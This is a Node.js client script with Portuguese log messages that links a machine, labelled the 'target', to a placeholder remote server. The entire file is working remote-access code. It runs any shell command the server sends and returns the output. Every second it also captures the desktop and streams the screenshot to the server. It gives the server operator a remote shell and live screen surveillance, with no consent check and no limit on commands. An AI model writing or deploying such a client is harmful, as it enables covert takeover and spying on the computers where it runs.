const io = require('socket.io-client');
const os = require('os');
const { exec } = require('child_process');
const screenshot = require('screenshot-desktop');
const isElectron = process.versions.hasOwnProperty('electron');

const CONFIG = {
    SERVER_URL: 'http://IP_DO_SERVIDOR',
    ACCESS_KEY: 'sua_chave_secreta_aqui',
    MACHINE_NAME: os.hostname()
};

class RemoteClient {
    constructor() {
        this.socket = null;
        this.machineId = null;
        this.screenInterval = null;
    }

    connect() {
        console.log('Conectando ao servidor...');
        this.socket = io(CONFIG.SERVER_URL);

        this.socket.on('connect', () => {
            console.log('Conectado! Autenticando...');
            this.socket.emit('auth', {
                key: CONFIG.ACCESS_KEY,
                role: 'target',
                machineName: CONFIG.MACHINE_NAME
            });
        });

        this.socket.on('auth-success', (data) => {
            console.log('Autenticado com sucesso!');
            this.machineId = data.machineId;
            this.startScreenCapture();
        });

        this.socket.on('execute-command', (data) => {
            console.log('Recebido comando:', data.command);
            this.executeCommand(data.command);
        });

        this.socket.on('disconnect', () => {
            console.log('Desconectado do servidor');
            this.stopScreenCapture();
        });
    }

    executeCommand(command) {
        console.log('Executando comando:', command);
        exec(command, { shell: true, encoding: 'utf8' }, (error, stdout, stderr) => {
            const output = error ? stderr : stdout;
            if (this.socket && this.socket.connected) {
                console.log('Enviando resposta:', output);
                this.socket.emit('cmd-response', {
                    output: output || 'Comando executado com sucesso'
                });
            }
        });
    }

    startScreenCapture() {
        if (this.screenInterval) {
            clearInterval(this.screenInterval);
        }

        this.screenInterval = setInterval(async () => {
            try {
                const img = await screenshot();
                if (this.socket && this.socket.connected) {
                    const base64Image = img.toString('base64');
                    this.socket.emit('screen-update', {
                        machineId: this.machineId,
                        image: base64Image
                    });
                }
            } catch (error) {
                console.error('Erro ao capturar tela:', error);
            }
        }, 1000);
    }

    stopScreenCapture() {
        if (this.screenInterval) {
            clearInterval(this.screenInterval);
            this.screenInterval = null;
        }
    }
}

const client = new RemoteClient();
client.connect();

if (!isElectron) {
    process.on('SIGINT', () => {
        console.log('Encerrando cliente...');
        client.stopScreenCapture();
        process.exit(0);
    });
} 